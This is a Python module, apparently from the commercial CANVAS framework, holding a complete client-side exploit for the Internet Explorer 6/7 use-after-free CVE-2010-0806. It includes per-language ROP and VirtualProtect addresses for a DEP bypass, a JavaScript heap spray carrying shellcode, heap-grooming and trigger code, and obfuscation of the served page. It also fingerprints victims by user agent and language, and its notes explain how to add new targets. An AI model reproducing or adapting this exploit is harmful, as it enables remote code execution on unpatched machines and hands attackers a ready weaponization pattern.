#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME='ie_peers_setattribute'
DESCRIPTION='IE Peers Use-After-Free'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='03/09/2010'
DOCUMENTATION['References']=['http://www.microsoft.com/technet/security/advisory/981374.mspx',
                             'http://www.microsoft.com/technet/security/bulletin/ms10-018.mspx']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='XP, IE 7, IE 6'
DOCUMENTATION['CVE Name'] = 'CVE-2010-0806'
DOCUMENTATION['Notes'] = """
This is the ie_peers exploit for IE 6/7, first discovered in the wild in March, 2010.
It will work on both DEP and non-DEP machines and should be reliable on XP SP2-3. 

It is fixed by: KB980182

Obviously, beating DEP the way we do here requires language-pack dependant
addresses.
"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP'] #Not tested on anything but a XP for the moment
PROPERTY['MSADV']='MS10-018'
PROPERTY['DELIVERY']='HTTP'
PROPERTY["Notes"] = """
This version of the ie_peers exploit bypasses DEP and works against Windows XP SP3 with IE6/7.
It does not, however, support HTTP MOSDEF (due to shellcode size limitations).
It will need a lot of RAM to be available - if your VM/machine does not have
at least a Gig of ram it may fail.
"""

NOTES="""

Tested on:
Windows XP Professional  SP3 under IE 6/IE 7 updated.

You may want to bump up the ram allocated to your VM if this exploit is not working for you.


Usage:
./commandlineInterface.py -p 5555 -v 9
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ie_peers_setattribute -l 10.10.11.1 -d 5555 -p 8080 -O httpmosdef:1

The Bug:
  The bug is an usual use-after free in the persisting-data Behaviour "userData".
  The setAttribute function takes the 2nd argument and do a VariantChangeTypeEx to transform 
 the object into a BSTR in order to serialize it. The real *bug* is that it used the src equal to the destination
 (IE8 doesn't do that, and thats why is not vulnerable).

  HRESULT VariantChangeTypeEx( VARIANTARG   *pvargDest, VARIANTARG   *pvarSrc, LCID   lcid, unsigned short  wFlags, VARTYPE  vt);
   
  The VariantChangeTypeEx combines the pvarSrc + the vt (type you want to transform it to) and use it into a big switch and jump to the correct transformation.
  In the case of an Object ( VT_DISPATCH = 9), if the pvargDest is a VT_DISPATCH it try to clear it through VariantClear, so it ends up calling Object->Release(). This will obviously decrement the Counter.

 On the TEAROFF classes, such as the Elements returned by document.createElement it does the decref through the PlainRelease. This function has 2 dword where it cache the thunk being deleted.
 We do two more setAttribute, in order to take p out of the cache and call MemFree. 
   e.setAttribute('s', p);
   e.setAttribute('s', t);
   e.setAttribute('s', w);
// We need chunks to allocate chunks of 0x2C (final) in order to replace it.
// SysAllocateLen (string allocation) seems to be doing some kind of padding so i'm not able to
// allocate a chunk of the correct chunk (also, the first  4 bytes goes for length).
   fillheap(h);

   The use-after-free Element gets trigger at the end, when trying to call the IDispatchExGetDispID which is the
   function used to dynamically call a method on object.
   p.paripa("GO");   // thats why the function doesn't really matter if it exist or not.
  

   Writing a new exploit version. Adding targets:
   a) Get Stack: 
      This is a little bit trick, the idea is to move the method name of an object into
    as your new stack. This is the first argument of the GetDispID function and the one that
    triggers the actual bug.
      The new way to do this, is to find a:
      XCHG EAX, ESP
      POP ESP
      RETN
      This compiles to: 94 5c c3
      
      This will basically is going to use the vtable when we trigger GetDisp on the p object.
       p["createElement" ]();
     
      At the moment of triggering the GetDisp EAX points to the vtable, so we use that and
      pop ESP from it, which will end up being our MEMORY LEAK:
       b = base + b + shellcode;

      And we start with the ret2libc dep bypass magic.
      
   b) kernel32.dll VirtualProtect address

"""

CHANGELOG="""
"""

targets={
    0:['N/A', None, 0],
    #  Name       language       Get Stack           kernel32!VirtualProtect
    #English Windows
    1:['Windows XP SP3/2 - IE7 ', 'en-us', ("0x755c1334", "0x7c801AD0")],
    #Japanese Windows
    2:['Windows XP SP2 - IE6/7 Japanese', 'ja', ("0x76e9102c", "0x7c801AD0")],
    # Spanish Windows
    # VirtualProtect is actually at D4 not D0, but there are NOPs there.
    # Only SP3 was tested. Should also work on SP2.
    3:['Windows XP SP3 - IE6/7 ', 'es', ("0x75161334", "0x7c801AD4")],
    #Traditional Chinese (Taiwan)
    4:['Windows XP SP2 IE6/7 Traditional Chinese', 'zh-tw', ("0x73641334","0x7c801AD0")],
    #English IE6
    5:['Windows XP SP3/2 - IE6 ', 'en-us', ("0x66e5130c", "0x7c801AD0")],
}
 
 

import string, random
class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version=0
        self.name=NAME 
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        # Set up our javascript obfuscator, this could be done in httpclientside class
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.language = "" #"en-us" # uncomment this to default to English version
        self.plugin_info = None # we want clientd to give us a plugin dict
        
        #HTTPMOSDEF shellcode is 2100 bytes or so - our shellcode space is 2044 or so. 
        #XXX: We need to switch to SearchCode?
        self.nohttpmosdef = True 
        return

    # This is expecting an info_dict that is populated like so:
    #
    # info_dict['plugins'] = parse_plugin_data(plugins_dict)
    # info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
    #
    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    
    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run,
        in this case, it means "running IE 7 and a language we have 
        a target for.
        """ 
        if "MSIE 7.0" in info_dict['user_agent'] or "MSIE 6" in info_dict['user_agent']:
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("language found: %s"%language)
            for t in targets.keys():
                target=targets[t]
                if target[1] == language:
                    #found language, and is IE7
                    #high value because it is reliable, recent and it defeats dep
                    self.log("Found vulnerable target")
                    return 50
        else:
            self.log("Not IE 6/7 - possibly vulnerable, but not to this exploit")
            self.log("User Agent: %s"%info_dict.get("user_agent"))
        #not ie 7 or we don't have the language
        return 0

    def set_version_from_language(self, target_info):
        """
        We key on language right now (although really it could be a dictionary of things)
        """
        language=target_info["language"]
        if self.msie6:
            ieversion = '6'
        else:
            ieversion = '7'
        for t in targets.keys():
            if targets[t][1]==language:
                if targets[t][0].count(ieversion):
                    self.log("Using target version: %s: %s"%(t,repr(targets[t])))
                    self.version=t 
                    break
        return self.version
    
    def makefile(self, request_header=None):
        """
        Makes the exploit HTML
        """
        self.getArgs()
        if not self.version:
            #i.e. we are not using clientd
            if self.language:
                if not request_header:
                    self.log("Assuming IE 7 since we didn't get a request header!")
                    self.msie6 = False 
                else:
                    self.log("Checking IE version from Request Header")
                    
                    if "MSIE 6" in request_header.getHeaderValue("User-Agent"):
                        self.log("IE 6 detected")
                        self.msie6 = True
                    else:
                        self.log("Not IE 6")
                        self.msie6 = False 
                #need to autodetect language here too from Accept-Language
                self.log("Running against language set manually: %s"%self.language)
                self.set_version_from_language({"language":self.language})
            else:
                self.log("We are running without plugin_info or version - returning no page!")
                return "" 
        if not self.version:
            self.log("No version was set! Bailing out...")
            return ""
        targ = targets[self.version][2]
        
        if not hasattr(self, "shellcode") or not self.shellcode:
            self.log("Regenerating shellcode in makefile")
            self.createShellcode()
            
        filedata="""<html>     
    <body>         
    <script language="JavaScript">
    """

        script = """
    function spray()
    {
      var array = new Array();
      var ls = 0x7F000;


      var shellcode = unescape("%u9090%u9090%u9090") +   unescape("SHELLCODE");
      
      base =myescape(NTPROTECT);
      base+=myescape(0x0d0db8bc);
      base+=myescape(0x0d0d0000);
      base+=myescape(0x10000);
      base+=myescape(0x40);
      base+=myescape(0x0d0db8b0);
      base+=myescape(0xc0c4c0c1);
      base+=myescape(GETMESTACK);
    
      base = unescape(base);

      
      var t = unescape("%u0d0d");
      var b = unescape("%u0d0d");
      while(b.length < (0x7fc-12-shellcode.length))  { 
            b+=t;
      }
      //b= unescape( "%u9090%u9090" + myescape(GETMESTACK)) + b + shellcode;
      b = base + b + shellcode;

      b = b.substring(0,b.length); 

      while(b.length < ls/2) {
        b += b
      }

      var lh = b.substring(0,ls/2);
      delete b;

      for(i=0;i<270;i++) {
        array[i] = lh + lh + shellcode; 
      }
      return array;
    }
    """
        if self.msie6:
            script += """
    function createheap(){
        var a = Array();
        for (i = 0; i < 0x500; i++){
            a[i] = document.createElement("button");
        }
        return a;
    }
    function fillheap( a){
        var thereal = unescape("\u1024\u0d0d\uc0c4\u4141\u4141\u4141");
        var theteal = unescape("\u1024\u0d0d\uc0c4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
        var theueal = unescape("\u1024\u0d0d\uc0c4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
        for(i=0; i < 0x500; i+=3)
        {
            a[i].name = theueal;
        }

        for(i=1; i < 0x500; i+=3)
        {
            a[i].name = theteal;
        }
        for(i=2; i < 0x500; i+=3)
        {
            a[i].name = thereal;
        }
    }
    function makeholes(a){
        for(i = 0x0; i < 0x450; i+=2)
            a[i].name = '';
    }
    """
        else:
            script += """
    function createheap() { 
         var a = new Array();
         for(i=0; i < 0x10; i++) { 
           var client = new XMLHttpRequest();
           a[i] = client;
          }     
      return a;
    } 
   function fillheap( a) { 
          // Allocate a chunk of a given size. I can control the first 4 bytes.

          var cont = unescape("\u1024\u0d0d\uc0c4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");

          for(i=0; i < 0x10; i++) { 
                a[i].open("GET", cont);
          } 
   } 
   """
        script += """
   function hexa(val) {
     var str=new Number(val).toString(16);
     while (str.length < 4)  str = "0" + str;
     return str;
   }


   function myescape(addr) {
      var str="";
      str="%u"+hexa(addr&0xffff)+"%u"+hexa((addr>>16)&0xffff);
      return str;
}

    function build_exploit() {
"""
        if self.msie6:
            script += """
      sp = spray();
      l = createheap();
      h = createheap();

      var e = document.createElement("P");
      e.addBehavior("#default#userData");
      document.body.appendChild(e);

      e.setAttribute('a', "string");

      fillheap(l);    

      var p = document.createElement("A");
      var t = document.createElement("UL");
      var w = document.createElement("HEAD");
      
      makeholes(l);

      e.setAttribute('b', p);
      e.setAttribute('c', t);
      e.setAttribute('d', w);
      fillheap(h);
      p['createElement']();
    } 
    build_exploit()
      
"""
        else:
            script += """
       var e = document.createElement("P");
       var p = document.createElement("A");
       var t = document.createElement("UL");
       var w = document.createElement("HEAD");
       h = createheap();
       spray();
       e.addBehavior("#default#userData");
       document.body.appendChild(e);
       e.setAttribute('s', p);
       e.setAttribute('s', t);
       e.setAttribute('s', w);
       fillheap(h);
       p['createElement']();
    }
    build_exploit()                                   
 
"""
        script = script.replace('SHELLCODE',urluencode(self.shellcode))
        script=  script.replace("GETMESTACK", targ[0] )
        script = script.replace("NTPROTECT", targ[1])
        
        #not used anymore
        #script = script.replace("ADDFOURBYTES", str(self.version))

        filedata += self.jsObfuscator.obfuscate(script)
        filedata += """
    </script>  
  </body>
</html>
"""
        return filedata
        # 0x75c9c2b9

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            
            if self.is_vulnerable(self.plugin_info):
                self.log("This client is most likely vulnerable!")
                #check for IE 6
                if info_dict['user_agent'].count('MSIE 6'):
                    self.msie6 = True
                else:
                    self.msie6 = False     			            
                language=self.plugin_info["plugins"].get("language")
                if not language:
                    self.log("Very odd error: no language in plugin info!")
                    return None, None 
                
                if type(language)==type([]):
                    language=language[0] #it's possibly a list in actuality
                self.set_version_from_language({"language":language})
                
                if self.version==0:
                    self.log("Didn't find a target for that language (%s) - very odd"%(language))
                    return None, None 
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable (%s)"%self.plugin_info.get("language"))
                return None, None            
        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring=self.makefile(request_header = clientheader)
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
        
    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")
        self.getarg("language")
        return
        
    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        
        # Build the html that triggers the vulnerability
        filedata=self.makefile()
        
        self.log('Opening %s for output'%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
